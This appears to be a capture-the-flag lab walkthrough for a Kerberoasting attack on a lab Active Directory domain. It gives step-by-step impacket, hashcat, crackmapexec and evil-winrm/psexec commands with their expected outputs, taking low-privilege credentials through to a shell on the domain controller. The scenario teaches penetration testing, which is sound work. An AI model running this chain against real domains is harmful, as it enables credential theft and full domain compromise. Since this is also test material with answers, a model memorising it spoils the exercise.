# Scenario 24 — Kerberoast a service account to Domain Admin

**Difficulty:** 🔴 | **Time:** ~35 min | **Domains:** 02, 06, 13
**Tools:** [impacket](../../tools/impacket.md), [hashcat](../../tools/hashcat.md), [crackmapexec](../../tools/crackmapexec.md), [evil-winrm](../../tools/evil-winrm.md)

## Story
You have valid low-priv domain credentials `jdoe:Password1` on the `corp.local` domain (DC = 10.10.10.24). Extract a Kerberos service ticket, crack it, and use the recovered credential to access the DC.

## Step 1 — Verify creds
```bash
crackmapexec smb 10.10.10.24 -u jdoe -p 'Password1' -d corp.local
```
**Expected finding:** `[+] corp.local\jdoe:Password1`.
**→ Tool ref:** [crackmapexec smb](../../tools/crackmapexec.md#smb)

## Step 2 — Enumerate SPNs
**What we're doing:** Any user with a registered SPN can be Kerberoasted.
```bash
GetUserSPNs.py corp.local/jdoe:Password1 -dc-ip 10.10.10.24
```
**Expected finding:** service accounts like `svc_sql`, `svc_backup`.
**→ Tool ref:** [impacket GetUserSPNs](../../tools/impacket.md#getuserspns)

## Step 3 — Request TGS and dump hash
```bash
GetUserSPNs.py corp.local/jdoe:Password1 -dc-ip 10.10.10.24 -request -outputfile spns.hash
```
**Expected finding:** `$krb5tgs$23$*svc_sql$corp.local$...` hashes.

## Step 4 — Crack with hashcat
```bash
hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt --force
```
**Expected finding:** `svc_sql:Summer2023!`.
**→ Tool ref:** [hashcat modes](../../tools/hashcat.md#mode-reference)

## Step 5 — Check svc_sql privileges
```bash
crackmapexec smb 10.10.10.24 -u svc_sql -p 'Summer2023!' -d corp.local
```
**Expected finding:** `(Pwn3d!)` marker = local admin on the DC.

## Step 6 — Shell via evil-winrm / psexec
```bash
evil-winrm -i 10.10.10.24 -u svc_sql -p 'Summer2023!'
# or
psexec.py corp.local/svc_sql:'Summer2023!'@10.10.10.24
```

## Step 7 — Read the flag
```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

## Step 8 — Final answer
**Answer format:** flag value.

## Gotchas across this chain
- Hashcat mode `13100` = TGS-REP RC4. For AES-encrypted tickets use `19700` (AES128) / `19600` (AES256).
- Time skew > 5 min → Kerberos refuses tickets. Sync with `ntpdate 10.10.10.24` or `rdate`.
- `-usersfile` speeds up if you already know the SPN target.
- Crackmapexec's `Pwn3d!` means you're admin; absent it, try `--shares`.

## Variant questions this scenario teaches
- "Which service account has a weak password?"
- "What is the plaintext password of svc_sql?"
- "What is the NTLM hash of the Administrator?" (next step: secretsdump)

